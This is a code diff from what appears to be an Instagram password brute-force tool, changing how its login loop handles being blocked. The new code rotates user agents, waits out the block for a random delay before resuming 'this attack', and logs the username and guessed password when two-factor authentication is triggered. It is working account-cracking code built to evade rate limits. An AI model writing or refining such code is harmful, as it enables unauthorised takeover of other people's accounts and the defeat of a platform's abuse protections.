@@ -130,24 +130,32 @@ class IgInteract:
                     if attempts > 0:
                         self.print_it.error(f"Request blocked, attempting rotation to \"{user_agent}\"")
                         user_agent, headers = IgTools.random_ig_user_agent()
-                        if rotation > 2:
+                        if rotation > 2 and rotation < 15:
                             self.print_it.info(f"Total Attempts: {attempts}")
-                            
-                        rotation += 1
-                        
-                    else:
-                        self.print_it.error(f"Username \"{self.username}\" dont exists or you have been blocked in ig.")
-                        r = self.print_it.yes_no(f"Do you want to continue this attack? the program will wait the blocked timeout")
-                        if r:
-                            random_timeout = random.randint(180,2800)
-                            for seconds in range(random_timeout, 0, -1):
-                                self.print_it.info(f"Waiting {seconds} seconds for continue.")
-                                time.sleep(1)
+                            self.print_it.error(f"You have been blocked in ig.")
+                            r = self.print_it.yes_no(f"Do you want to continue this attack? the program will wait the blocked timeout")
+                            if r:
+                                rotation = 0
+                                random_timeout = random.randint(180,2800)
+                                for seconds in range(random_timeout, 0, -1):
+                                    self.print_it.info(f"Waiting {seconds} seconds for continue.")
+                                    time.sleep(1)
+                                    
+                            else:
+                                self.print_it.error(f"User stoped.")
+                                break
                                 
-                        else:
-                            self.print_it.error(f"User stoped.")
+                        elif rotation > 15:
+                            self.print_it.error(f"Too many rotations executed, maybe the block is too much longer.")
                             break
-
+                            
+                        attempts += 1
+                        rotation += 1
+                    
+                    else:
+                        self.print_it.error(f"Username \"{self.username}\" dont exists in ig.")
+                        break
+                        
                 except TwoFactorRequired:
                     self.print_it.error(f"2FA Required to login in this account, user:{self.username}:password:{item}")
                     break
